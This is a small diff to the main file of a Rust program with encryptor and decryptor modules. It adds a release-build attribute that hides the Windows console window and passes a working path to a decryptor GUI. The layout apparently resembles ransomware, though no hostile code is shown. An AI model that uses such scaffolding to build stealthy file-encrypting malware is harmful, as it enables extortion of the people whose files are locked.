@@ -1,3 +1,5 @@
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
+
 mod encryptor;
 mod decryptor;
 #[cfg(windows)]
@@ -31,7 +33,7 @@ fn main() -> Result<()> {
     match get_status_data(&working_path) {
         Ok(data) => {
             #[cfg(windows)]
-            start_decryptor_gui(data)?;
+            start_decryptor_gui(data, working_path)?;
             #[cfg(not(windows))]
             {
                 dbg!(data);
